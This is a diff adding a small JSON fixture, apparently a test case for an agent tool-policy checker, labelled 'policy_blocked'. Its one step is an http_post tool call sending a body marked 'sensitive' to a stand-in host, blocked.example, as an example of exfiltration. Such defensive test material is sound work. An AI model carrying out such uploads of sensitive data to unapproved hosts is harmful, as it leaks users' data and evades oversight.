@@ -1,0 +1,15 @@
+{
+  "category": "policy_blocked",
+  "name": "synthetic_0023",
+  "steps": [
+    {
+      "args": {
+        "json_body": {
+          "payload": "sensitive"
+        },
+        "url": "https://blocked.example/upload"
+      },
+      "tool_name": "http_post"
+    }
+  ]
+}
